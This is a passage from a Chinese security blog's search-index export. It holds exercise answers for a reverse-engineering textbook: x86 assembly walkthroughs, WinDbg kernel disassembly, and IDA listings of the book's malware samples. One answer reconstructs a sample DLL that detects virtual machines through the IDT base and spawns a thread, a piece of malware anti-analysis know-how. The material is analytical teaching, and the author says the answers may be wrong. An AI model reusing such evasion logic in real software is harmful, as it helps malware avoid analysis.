需要注意，它们当一个用户初始化 RDP 连接时出现。例如使用 mstsc.exe 链接服务器： Microsoft-Windows-RPC Event EID Channel Example Server RPC Call Start 5 Debug Client RPC Call Start 6 Debug Conclusion推荐阅读：Tampering with Windows Event Tracing: Background, Offense, and Defense | by Palantir | Palantir Blog Github 仓库：nasbench/ETW-Resources: Event Tracing For Windows (ETW) Resources (github.com) 下一篇文章（已经发出来了，上面的 Providers 一段）：Finding Detection and Forensic Goodness In ETW Providers | by Nasreddine Bencherchali | Aug, 2021 | Medium","link":"/2021/10/06/etw/"},{"title":"逆向工程实战","text":"《逆向工程实战》 练习解答此部分为书中的练习题解答，不保证正确。 1.3 [EBP+8] 和 [EBP+C] 的类型可以从 mov 指令的另一个操作数中看出，第一行目的操作数是 edi，所以 [EBP+8] 是 DWORD；第八行目的操作数是 AL，[EBP+C] 是 byte。 第1、2行，从栈上读取参数存入 EDI，并在 EDX 中备份。第三行清空 EAX，第四行将 ECX 设为 -1。 第五行 Scasb 为 Scan String Byte，将 AL（此处为0） 与 EDI 所指的字符串逐字节比较，每次比较后递增 EDI，并递减 ECX。repne 为 Repeat Not Equal，在不相等时重复。在 ECX 不为 0 且 EF 不为 0 时会重复执行后面的指令。在这里，就是查看 EDI 所指向的缓冲区的第一个字节是否为 0，如果是，退出循环，否则查看下一个字节。 第六行和第七行，由于 ECX 最初被设置为 -1，因此将 ECX 加 2 取负数后即为 repne 语句的执行次数，即在 EDI 所指向的缓冲区中第一次查找到 0 之前的字节数（去除结尾 0 之后的字符串长度）。 第八行读取栈上的参数存入 AL，第九行把在 EDX 中备份的 EDI 恢复。 第十行 rep 将执行 ECX 次，stosb 为 Store String Byte，将 AL 存入 EDI 所指的缓冲区，并递增 EDI，递减 ECX。因此本条将用 AL 填充 EDI 所指的缓冲区 0 之前的部分。 第十一行将备份的 EDI 作为返回值。 整个代码段的作用是用某个 BYTE 填充缓冲区中 0 之前的部分。例如缓冲区内容为abc\\0def，使用 2填充后结果为222\\0def。 1,4 （1）call $+5, pop eax，$+5 是距离当前指令 5 字节的地址，而 call $+5 本身占 5 字节，所以这条指令没有改变执行流，但是将下一条指令的地址（EIP，指向 pop eax 这条指令）压栈了，此时 pop eax，就读到了EIP 的值。x86 不允许直接操作 EIP。 （2）push 0xaabbccdd, ret，或者call 0xaabbccdd。 （3）addme 如果不 pop ebp，执行 ret 相当于 pop eip，会将 ebp 指向的内容作为代码执行，一般会崩溃。 （4）环境: gcc 11.3.0，WSL（kali） a.c： 1234567long long lladd(int a,int b){ return a+b;}int main(){ lladd(1,2);} 编译为 32 位，输出汇编文件，由于是 WSL，汇编是 AT&amp;T 的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273$ gcc -S -m32 -o a.s a.c$ cat a.s .file &quot;a.c&quot; .text .globl lladd .type lladd, @functionlladd:.LFB0: .cfi_startproc pushl %ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl %esp, %ebp .cfi_def_cfa_register 5 call __x86.get_pc_thunk.ax addl $_GLOBAL_OFFSET_TABLE_, %eax movl 8(%ebp), %edx movl 12(%ebp), %eax addl %edx, %eax cltd popl %ebp .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE0: .size lladd, .-lladd .globl main .type main, @functionmain:.LFB1: .cfi_startproc leal 4(%esp), %ecx .cfi_def_cfa 1, 0 andl $-8, %esp pushl -4(%ecx) pushl %ebp movl %esp, %ebp .cfi_escape 0x10,0x5,0x2,0x75,0 pushl %ecx .cfi_escape 0xf,0x3,0x75,0x7c,0x6 subl $4, %esp call __x86.get_pc_thunk.ax addl $_GLOBAL_OFFSET_TABLE_, %eax pushl $2 pushl $1 call lladd addl $8, %esp movl $0, %eax movl -4(%ebp), %ecx .cfi_def_cfa 1, 0 leave .cfi_restore 5 leal -4(%ecx), %esp .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE1: .size main, .-main .section .text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat .globl __x86.get_pc_thunk.ax .hidden __x86.get_pc_thunk.ax .type __x86.get_pc_thunk.ax, @function__x86.get_pc_thunk.ax:.LFB2: .cfi_startproc movl (%esp), %eax ret .cfi_endproc.LFE2: .ident &quot;GCC: (Debian 11.3.0-3) 11.3.0&quot; .section .note.GNU-stack,&quot;&quot;,@progbits 主要看 lladd 函数，内容用 Intel 汇编应该是这样： 1234567push ebpmov ebp,espmov edx, [ebp+8]mov eax, [ebp+12]cdqpop ebpret cdq 是将 EAX 扩展成 QWORD，高 32 位存储在 EDX。EDX 的内容使用 EAX 的符号位填充，当 EAX 为负数时，EDX 为 0xffffffff，EAX 为正数时，EDX 为 0。所以这里的结论就是使用 long long 类型作为返回值时，结果会保存在 EDX:EAX 中（高 32 位存在 EDX，低 32 位存在 EAX）。 1.7 1 用到的文档： DllMain entry point (Process.h) - Win32 apps | Microsoft Docs CreateToolhelp32Snapshot function (tlhelp32.h) - Win32 apps | Microsoft Docs Process32First function (tlhelp32.h) - Win32 apps | Microsoft Docs Process32Next function (tlhelp32.h) - Win32 apps | Microsoft Docs Process32Next function (tlhelp32.h) - Win32 apps | Microsoft Docs 栈布局： 2反编译： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455typedef struct _IDTR { DWORD base, WORD limit} IDTR;typedef struct tagPROCESSENTRY32 { DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; DWORD cntThreads; DWORD th32ParentProcessID; LONG pcPriClassBase; DWORD dwFlags; CHAR szExeFile[MAX_PATH];} PROCESSENTRY32;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ IDTR idt; HANDLE hSnapshot; PROCESSENTRY32 pe; __sidt(&amp;idt); if(idt.base &gt; 0x8003f400 &amp;&amp; idt.base &lt; 0x80047400){ return 0; } memset(&amp;pe, 0, sizeof(pe)); hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hSnapshot == INVALID_HANDLE_VALUE) return FALSE; pe.dwSize = 128h; if(Process32First(hSnapshot ,&amp;pe) == 0){ return FALSE; } if(stricmp(pe.szExeFile, 0x10007c50) != 0){ while(Process32Next(hSnapshot , &amp;pe) != 0){ if(stricmp(pe.szExeFile, 0x10007c50) == 0) break; } } if(pe.th32ProcessId - pe.th32ParentProcessId == 0) { return FALSE; } if(fdwReason == DLL_PROCESS_ATTACH){ CreateThread(0,0,100d32d0h,0,0,0); return TRUE; } return FALSE;} 3这种情况是编译器所作的名称修饰（修饰名 | Microsoft Docs），文档中描述的比较清晰，具体到 DllMain，由于采用了 STDCALL，所以需要前导下划线；参数列表中包含 12 字节的参数，所以@12。 4123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128.386 .model flat,cpublic tttt,strlen1,strchr1.codetttt PROC ;test mov eax,10 rettttt ENDP strlen1 procpush ebpmov ebp,espmov edi, [ebp+8]xor eax,eaxmov ecx,0ffffffffhrepne scasbadd ecx,2neg ecxmov eax,ecxmov esp,ebppop ebpret strlen1 endp strchr1 proc push ebpmov ebp,esp mov edi,[ebp+8]mov eax,[ebp+12]mov ecx,0ffffffffhrepne scasbadd ecx,2neg ecx dec edimov eax,edimov esp,ebppop ebpret strchr1 endpmemcpy1 proc push ebpmov ebp,espmov ecx, [ebp+16]mov esi, [ebp+12]mov edi, [ebp+8]push edimemcpyloop: lodsb stosb dec ecx jnz memcpylooppop eax mov esp,ebppop ebpret memcpy1 endpmemset1 procpush ebpmov ebp,espmov ecx,[ebp+16]mov eax,[ebp+12]mov edi,[ebp+8]push edirep stosbpop eax mov esp,ebppop ebpret memset1 endp strcmp1 proc push ebpmov ebp,espxor edx,edxmov edi,[ebp+12]mov esi,[ebp+8]strcmploop:cmpsbja strcmpajb strcmpbmov dl, [esi]cmp edx,0je strcmpe inc esiinc edijmp strcmploopstrcmpe:mov eax,0mov esp,ebppop ebpret strcmpb:mov eax,-1mov esp,ebppop ebpret strcmpa:mov eax,1mov esp,ebppop ebpret strcmp1 endp strset1 procpush ebpmov ebp,esp xor edx,edxmov eax,[ebp+12]mov edi,[ebp+8]push edistrsetloop:mov dl,[edi]cmp edx,0jz strsetfstosbjmp strsetloopstrsetf:pop eaxmov esp,ebppop ebpret strset1 endpEND 测试程序： 12345678910111213141516171819202122232425262728293031#include &quot;pureasm.h&quot;#include &lt;stdio.h&gt;int main(){ int c = tttt(1, 2); char str1[100] = &quot;String 1, length: 20&quot;; char buffer[100] = { 0 }; // size_t strlen(const char *str) size_t len = 0; printf(&quot;strlen(str1) is %d\\n&quot;, strlen1(str1)); // char *strchr(const char *str, int c) printf(&quot;strchr(str1, '1') is %s\\n&quot;, strchr1(str1, '1')); // void *memcpy(void *dest, const void *src, size_t n) printf(&quot;memcpy(buffer, str1, 10) is %s\\n&quot;, memcpy1(buffer, str1, 10)); // void *memset(void *str, int c, size_t n) printf(&quot;memset(buffer, 97, 5) is %s\\n&quot;, memset1(buffer, 97, 5)); // int strcmp(const char *str1, const char *str2) printf(&quot;strcmp(str1,\\&quot;String 1, length: 20\\&quot;) is %d\\n&quot;, strcmp1(str1, &quot;String 1, length: 20&quot;)); printf(&quot;strcmp(str1,buffer) is %d\\n&quot;, strcmp1(str1, buffer)); // char *strset(char *str, char c); printf(&quot;strset(str1,'C') is %s&quot;, strset1(str1, 'C')); return 0;} 5KeInitializeDpc 12345678910111213141516nt!KeInitializeDpc:828f0d25 8bff mov edi,edi828f0d27 55 push ebp828f0d28 8bec mov ebp,esp828f0d2a 8b4508 mov eax,dword ptr [ebp+8]828f0d2d 33c9 xor ecx,ecx828f0d2f 83601c00 and dword ptr [eax+1Ch],0828f0d33 c60013 mov byte ptr [eax],13h828f0d36 c6400101 mov byte ptr [eax+1],1828f0d3a 66894802 mov word ptr [eax+2],cx828f0d3e 8b4d0c mov ecx,dword ptr [ebp+0Ch]828f0d41 89480c mov dword ptr [eax+0Ch],ecx828f0d44 8b4d10 mov ecx,dword ptr [ebp+10h]828f0d47 894810 mov dword ptr [eax+10h],ecx828f0d4a 5d pop ebp828f0d4b c20c00 ret 0Ch KeInitializeApc 12345678910111213141516171819202122232425262728293031323334353637383940414243nt!KeInitializeApc:828ffdf3 8bff mov edi,edi828ffdf5 55 push ebp828ffdf6 8bec mov ebp,esp828ffdf8 8b4508 mov eax,dword ptr [ebp+8]828ffdfb 8b5510 mov edx,dword ptr [ebp+10h]828ffdfe 8b4d0c mov ecx,dword ptr [ebp+0Ch]828ffe01 c60012 mov byte ptr [eax],12h828ffe04 c6400230 mov byte ptr [eax+2],30h828ffe08 83fa02 cmp edx,2828ffe0b 7506 jne nt!KeInitializeApc+0x20 (828ffe13) Branchnt!KeInitializeApc+0x1a:828ffe0d 8a9134010000 mov dl,byte ptr [ecx+134h]nt!KeInitializeApc+0x20:828ffe13 894808 mov dword ptr [eax+8],ecx828ffe16 8b4d14 mov ecx,dword ptr [ebp+14h]828ffe19 894814 mov dword ptr [eax+14h],ecx828ffe1c 8b4d18 mov ecx,dword ptr [ebp+18h]828ffe1f 88502c mov byte ptr [eax+2Ch],dl828ffe22 894818 mov dword ptr [eax+18h],ecx828ffe25 8b4d1c mov ecx,dword ptr [ebp+1Ch]828ffe28 33d2 xor edx,edx828ffe2a 89481c mov dword ptr [eax+1Ch],ecx828ffe2d 3bca cmp ecx,edx828ffe2f 740e je nt!KeInitializeApc+0x4c (828ffe3f) Branchnt!KeInitializeApc+0x3e:828ffe31 8a4d20 mov cl,byte ptr [ebp+20h]828ffe34 88482d mov byte ptr [eax+2Dh],cl828ffe37 8b4d24 mov ecx,dword ptr [ebp+24h]828ffe3a 894820 mov dword ptr [eax+20h],ecx828ffe3d eb06 jmp nt!KeInitializeApc+0x52 (828ffe45) Branchnt!KeInitializeApc+0x4c:828ffe3f 88502d mov byte ptr [eax+2Dh],dl828ffe42 895020 mov dword ptr [eax+20h],edxnt!KeInitializeApc+0x52:828ffe45 88502e mov byte ptr [eax+2Eh],dl828ffe48 5d pop ebp828ffe49 c22000 ret 20h ObFastDereferenceObject 1234567891011121314151617181920212223242526272829303132333435363738nt!ObFastDereferenceObject:828d0a2c 8bff mov edi,edi828d0a2e 55 push ebp828d0a2f 8bec mov ebp,esp828d0a31 51 push ecx828d0a32 8b0a mov ecx,dword ptr [edx]828d0a34 56 push esi828d0a35 57 push edi828d0a36 8bc1 mov eax,ecx828d0a38 eb13 jmp nt!ObFastDereferenceObject+0x21 (828d0a4d) Branchnt!ObFastDereferenceObject+0xe:828d0a3a 8d4101 lea eax,[ecx+1]828d0a3d 8bf0 mov esi,eax828d0a3f 8bfa mov edi,edx828d0a41 8bc1 mov eax,ecx828d0a43 f00fb137 lock cmpxchg dword ptr [edi],esi828d0a47 3bc1 cmp eax,ecx828d0a49 7412 je nt!ObFastDereferenceObject+0x31 (828d0a5d) Branchnt!ObFastDereferenceObject+0x1f:828d0a4b 8bc8 mov ecx,eaxnt!ObFastDereferenceObject+0x21:828d0a4d 334508 xor eax,dword ptr [ebp+8]828d0a50 83f807 cmp eax,7828d0a53 72e5 jb nt!ObFastDereferenceObject+0xe (828d0a3a) Branchnt!ObFastDereferenceObject+0x29:828d0a55 8b4d08 mov ecx,dword ptr [ebp+8]828d0a58 e86672ffff call nt!ObfDereferenceObject (828c7cc3)nt!ObFastDereferenceObject+0x31:828d0a5d 5f pop edi828d0a5e 5e pop esi828d0a5f 59 pop ecx828d0a60 5d pop ebp828d0a61 c20400 ret 4 KeInitializeQueue 12345678910111213141516171819202122232425262728293031nt!KeInitializeQueue:8290487b 8bff mov edi,edi8290487d 55 push ebp8290487e 8bec mov ebp,esp82904880 8b4508 mov eax,dword ptr [ebp+8]82904883 c60004 mov byte ptr [eax],482904886 c640020a mov byte ptr [eax+2],0Ah8290488a 33d2 xor edx,edx8290488c 885001 mov byte ptr [eax+1],dl8290488f 895004 mov dword ptr [eax+4],edx82904892 8d4808 lea ecx,[eax+8]82904895 894904 mov dword ptr [ecx+4],ecx82904898 8909 mov dword ptr [ecx],ecx8290489a 8d4810 lea ecx,[eax+10h]8290489d 894904 mov dword ptr [ecx+4],ecx829048a0 8909 mov dword ptr [ecx],ecx829048a2 8d4820 lea ecx,[eax+20h]829048a5 894904 mov dword ptr [ecx+4],ecx829048a8 8909 mov dword ptr [ecx],ecx829048aa 8b4d0c mov ecx,dword ptr [ebp+0Ch]829048ad 895018 mov dword ptr [eax+18h],edx829048b0 3bca cmp ecx,edx829048b2 7506 jne nt!KeInitializeQueue+0x3f (829048ba) Branchnt!KeInitializeQueue+0x39:829048b4 8b0d6c999b82 mov ecx,dword ptr [nt!KeNumberProcessors (829b996c)]nt!KeInitializeQueue+0x3f:829048ba 89481c mov dword ptr [eax+1Ch],ecx829048bd 5d pop ebp829048be c20800 ret 8 KxWaitForLockChainValid 123456```KeReadyThread nt!KeReadyThread:828f11fc 8bff mov edi,edi828f11fe 56 push esi828f11ff 8bf0 mov esi,eax828f1201 8b4650 mov eax,dword ptr [esi+50h]828f1204 8b4874 mov ecx,dword ptr [eax+74h]828f1207 f6c107 test cl,7828f120a 7409 je nt!KeReadyThread+0x19 (828f1215) Branch nt!KeReadyThread+0x10:828f120c e84751f8ff call nt!KiInSwapSingleProcess (82876358)828f1211 84c0 test al,al828f1213 7505 jne nt!KeReadyThread+0x1e (828f121a) Branch nt!KeReadyThread+0x19:828f1215 e868ec0000 call nt!KiFastReadyThread (828ffe82) nt!KeReadyThread+0x1e:828f121a 5e pop esi828f121b c3 ret 12345KiInitializeTSS nt!KiInitializeTSS:82851359 8bff mov edi,edi8285135b 55 push ebp8285135c 8bec mov ebp,esp8285135e 8b4508 mov eax,dword ptr [ebp+8]82851361 b9ac200000 mov ecx,20ACh82851366 66894866 mov word ptr [eax+66h],cx8285136a 33c9 xor ecx,ecx8285136c 6a10 push 10h8285136e 66894864 mov word ptr [eax+64h],cx82851372 66894860 mov word ptr [eax+60h],cx82851376 59 pop ecx82851377 66894808 mov word ptr [eax+8],cx8285137b 5d pop ebp8285137c c20400 ret 4 12345RtlValidateUnicodeString ntdll!RtlValidateUnicodeString:771a70fc 8bff mov edi,edi771a70fe 55 push ebp771a70ff 8bec mov ebp,esp771a7101 837d0800 cmp dword ptr [ebp+8],0771a7105 0f85a4390300 jne ntdll!RtlValidateUnicodeString+0xb (771daaaf) ntdll!RtlValidateUnicodeString+0x12:771a710b 6800010000 push 100h771a7110 ff750c push dword ptr [ebp+0Ch]771a7113 e809000000 call ntdll!RtlUnicodeStringValidateEx (771a7121)771a7118 5d pop ebp771a7119 c20800 ret 8 12345678910111213#### 6感谢万能的网友，书中给出的 Sample H 的 SHA1 值为 cb3b2403e1d777c250210d4ed4567cb527cab0f4，这个样本（我）找不到。有网页：[Malware Samples For Educative Purposes (grsecurity.net)](https://grsecurity.net/malware_research/)，提供了本书中样本的合集，但其中 Sample H 的 SHA1 不同，并且这个 Sample H 并没有书中所说的``sub_13846``等等函数。查到一篇博客：[Practical Reverse Engineering Solutions – Page 35 (Part III) - my go at exercises 6 on page 35 (bin.re)](https://bin.re/blog/practical-reverse-engineering-solutions-page-35-part-iii/)，其中提到了书中对于 Sample H 给出的函数偏移始终比该 Sample H 大出 4 字节，因此实际指的是``sub_13842``。 .text:00013842 ; =============== S U B R O U T I N E =======================================.text:00013842.text:00013842.text:00013842 sub_13842 proc near ; CODE XREF: sub_1386E+2E8↓p.text:00013842 ; sub_13BE2+84↓p ….text:00013842 mov eax, [ecx+60h].text:00013845 push esi.text:00013846 mov esi, [edx+8].text:00013849 dec byte ptr [ecx+23h].text:0001384C sub eax, 24h ; ‘$’.text:0001384F mov [ecx+60h], eax.text:00013852 mov [eax+14h], edx.text:00013855 movzx eax, byte ptr [eax].text:00013858 push ecx.text:00013859 push edx.text:0001385A call dword ptr [esi+eax*4+38h].text:0001385E pop esi.text:0001385F retn.text:0001385F sub_13842 endp 123首先该函数采用的是 fastcall 约定，读了 ecx 和 edx，没有读取通过栈传递的参数，因此该函数应该有两个参数。读取的方式都是基地址+偏移的方式，因此 ecx 和 edx 应该是两个结构体的指针。函数原型： ret_type __fastcall sub_13842(pStruct1 pst1, pStruct2 pst2); 123接下来逐行来看，反编译一下 mov eax,[ecx+60h]var_type_1 v1 = pst1-&gt;off_60h; push esi // 保存 esi mov esi, [edx+8]var_type_2 v2 = pst2-&gt;off_8h; dec byte ptr [ecx+23h]pst1-&gt;off_23h–; // off_23h 占 1 字节 sub eax,24hv1 = (byte*)v1 - 24h; mov [ecx+60h], eaxpst1-&gt;off_60h = v1; mov [eax+14h],edxv1-&gt;off_14h = pst2; movzx eax, byte ptr [eax]int v3 = (byte)v1 push ecxpush edxcall dword ptr [esi+eax4+38h](v2 + v14 + 38h)(pst1,pst2) pop esiretn 123尝试还原一下数据类型 Struct1:unknown+0x23 v3 Byteunknown+0x60 v1 pStruct3 Struct2:unknown+0x8 pStruct4 Struct3:unknown+0x14 pStruct2 Struct4:unknown+0x38 pfnArray Array(function) 1234567书中要求看完第三章后回头看这个数据类型。#### 7同样是上面的网友给出了这个函数[practical-reverse-engineering/code.asm at master · baderj/practical-reverse-engineering (github.com)](https://github.com/baderj/practical-reverse-engineering/blob/master/chapter_1/page_35/exercise_7/code.asm) mov eax, [esp+4] push ebx push esi mov esi, [eax+3Ch] add esi, eax movzx eax, word ptr [esi+14h] xor ebx, ebx cmp [esi+6], bx push edi lea edi, [eax+esi+18h] jbe short loc_0_10BEB loc_0_10BCE: push [esp+0Ch+8] push edi call ds:dword_0_169A4 test eax, eax pop ecx pop ecx jz short loc_0_10BF3 movzx eax, word ptr [esi+6] add edi, 28h inc ebx cmp ebx, eax jb short loc_0_10BCE loc_0_10BEB: xor eax, eax loc_0_10BED: pop edi pop esi pop ebx retn 8 loc_0_10BF3: mov eax, edi jmp short loc_0_10BED 12反编译： ret_type sub_10BB6(arg_type_1 arg_1){ var_type_1 v1 = arg_1-&gt;off_3Ch; v1 += arg_1; int i = 0; // ebx var_type_2 v2 = v1-&gt;off_14h; var_type_3 v3 = （type *）（v1 + v2 + 18h）; if(v1-&gt;off_6 &gt;= 0){ return 0; } do{ if( dword_0_169a4(v3, arg_n) == 0){// esp+0ch+8 return v3; } v3 += 28h; i++; }while( i &lt; v1-&gt;off_6 );} 1234567891011差不多是这样。作者提示了这个函数是在搜索 PE 结构里的某些内容。首先粗略观察一下函数的开头，``arg_1``是某个结构体的指针，而``v1``也就是``arg_1-&gt;off_3Ch``应该是一个偏移量，因为稍后它又和``arg_1``相加了。接下来去 PE 结构里看看，哪个结构体偏移``3Ch``的地方保存着一个偏移量，第一眼看到的就是``IMAGE_DOS_HEADER``，它偏移``3Ch``的成员是``e_lfanew``，即``IMAGE_NT_HEADERS``的偏移，比较符合逻辑。那么先假设``arg_type_1``是``pIMAGE_DOS_HEADER``S。在此基础上，``v2``是 DWORD 类型的``SizeOfOptionalHeader``，``v3``是``pIMAGE_NT_HEADERS + SizeOfOptionalHeader + 18h``，其中 ``18h``正是``OptionalHeader``相对于``IMAGE_NT_HEADERS``的偏移，所以 ``v3``实际指向了第一个``IMAGE_SECTION_HEADER``。而``v1-&gt;off_6``指向的正是``NumberOfSections``，也就是``IMAGE_SECTION_HEADER``的个数。而出现在循环体里的常量``28h``是一个``IMAGE_SECTION_HEADER``的大小。由此看来，这个假设应该是成立的。综合来看，该函数接受一个``pIMAGE_DOS_HEADER``，在对应的 PE 文件的``IMAGE_SECTION_HEADER``数组中查找符合某条件（取决于``dowrd_0_169a4``函数）的某个``IMAGE_SECTION_HEADER``，如果查找到会返回该 Section Header 的指针，否则返回 0。#### 8根据上面提到的地址不同的问题，找到函数``sub_1172E``。 .text:0001172E ; =============== S U B R O U T I N E =======================================.text:0001172E.text:0001172E.text:0001172E sub_1172E proc near ; CODE XREF: sub_11798+115↓p.text:0001172E ; sub_11798+157↓p.text:0001172E.text:0001172E arg_0 = dword ptr 4.text:0001172E.text:0001172E push esi.text:0001172F mov esi, [esp+4+arg_0].text:00011733 dec esi.text:00011734 jz short loc_1175F.text:00011736 dec esi.text:00011737 jz short loc_11755.text:00011739 dec esi.text:0001173A jz short loc_1174B.text:0001173C sub esi, 9.text:0001173F jnz short loc_1176B.text:00011741 mov esi, [eax+8].text:00011744 shr esi, 1.text:00011746 add eax, 0Ch.text:00011749 jmp short loc_11767.text:0001174B ; —————————————————————————.text:0001174B.text:0001174B loc_1174B: ; CODE XREF: sub_1172E+C↑j.text:0001174B mov esi, [eax+3Ch].text:0001174E shr esi, 1.text:00011750 add eax, 5Eh ; ‘^’.text:00011753 jmp short loc_11767.text:00011755 ; —————————————————————————.text:00011755.text:00011755 loc_11755: ; CODE XREF: sub_1172E+9↑j.text:00011755 mov esi, [eax+3Ch].text:00011758 shr esi, 1.text:0001175A add eax, 44h ; ‘D’.text:0001175D jmp short loc_11767.text:0001175F ; —————————————————————————.text:0001175F.text:0001175F loc_1175F: ; CODE XREF: sub_1172E+6↑j.text:0001175F mov esi, [eax+3Ch].text:00011762 shr esi, 1.text:00011764 add eax, 40h ; ‘@’.text:00011767.text:00011767 loc_11767: ; CODE XREF: sub_1172E+1B↑j.text:00011767 ; sub_1172E+25↑j ….text:00011767 mov [ecx], esi.text:00011769 mov [edx], eax.text:0001176B.text:0001176B loc_1176B: ; CODE XREF: sub_1172E+11↑j.text:0001176B pop esi.text:0001176C retn 4.text:0001176C sub_1172E endp","link":"/2022/07/12/practical-reverse-engineering/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","link":"/tags/vulnhub/"},{"name":"渗透测试","slug":"渗透测试","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"tricks","slug":"tricks","link":"/tags/tricks/"},{"name":"AI","slug":"AI","link":"/tags/AI/"},{"name":"Powershell","slug":"Powershell","link":"/tags/Powershell/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"ssr","slug":"ssr","link":"/tags/ssr/"},{"name":"metasploit","slug":"metasploit","link":"/tags/metasploit/"},{"name":"tables","slug":"tables","link":"/tags/tables/"},{"name":"flask","slug":"flask","link":"/tags/flask/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"Struts2","slug":"Struts2","link":"/tags/Struts2/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"ETW","slug":"ETW","link":"/tags/ETW/"}],"categories":[{"name":"vulnhub","slug":"vulnhub","link":"/categories/vulnhub/"},{"name":"AI","slug":"AI","link":"/categories/AI/"},{"name":"Powershell","slug":"Powershell","link":"/categories/Powershell/"},{"name":"notes","slug":"notes","link":"/categories/notes/"},{"name":"metasploit","slug":"metasploit","link":"/categories/metasploit/"},{"name":"漏洞复现","slug":"漏洞复现","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"python","slug":"python","link":"/categories/python/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}]}